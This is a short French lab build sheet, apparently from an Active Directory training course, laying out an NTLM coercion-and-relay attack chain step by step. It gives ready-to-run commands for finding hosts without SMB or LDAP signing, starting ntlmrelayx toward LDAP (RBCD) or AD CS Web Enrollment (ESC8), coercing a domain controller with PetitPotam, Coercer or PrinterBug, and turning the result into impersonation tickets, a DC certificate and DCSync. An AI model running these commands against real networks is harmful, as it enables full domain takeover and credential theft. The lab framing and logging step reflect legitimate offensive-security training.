# Build — Coercition + relais NTLM (lab isolé GOAD-X)

## Pré-requis
- Poste attaquant sur le réseau du lab. Une cible sans signature (SMB/LDAP) ou AD CS Web Enroll HTTP.

## Étape 1 — Repérer les cibles relayables
```bash
nxc smb 10.10.0.0/24 --gen-relay-list relay_targets.txt   # hôtes sans SMB signing
nxc ldap 10.10.0.10                                        # vérifier LDAP signing/channel binding
```

## Étape 2 — Démarrer le relais (exemple LDAP → RBCD)
```bash
sudo ntlmrelayx.py -t ldap://10.10.0.10 --delegate-access --no-dump -smb2support
# ou vers AD CS (ESC8) : -t http://PAR-CA-01/certsrv/certfnsh.asp --adcs --template DomainController
```

## Étape 3 — Coercer une machine (ex. un DC)
```bash
python3 PetitPotam.py <attacker_ip> 10.10.0.10          # MS-EFSRPC
# ou : coercer coerce -u user -p pass -t 10.10.0.10 -l <attacker_ip>
# ou PrinterBug : dementor.py / printerbug.py
```

## Étape 4 — Exploiter le résultat
- **LDAP relay --delegate-access** : ntlmrelayx crée un compte machine + pose une RBCD → `getST`
  -impersonate (module 53) → accès admin.
- **AD CS relay (ESC8)** : certificat du DC → `certipy auth` → TGT du DC → DCSync (module 56).

## Étape 5 — Consigner
Journaliser la chaîne (coercition → relais → résultat) + les Event IDs observés.

## Vérification
- Un accès/certificat obtenu en tant que le compte machine coercé.

## Pièges courants
- Cible avec **signature requise** → relais échoue (c'est la défense).
- Mauvais déclencheur de coercition selon les patchs (essayer plusieurs via Coercer).
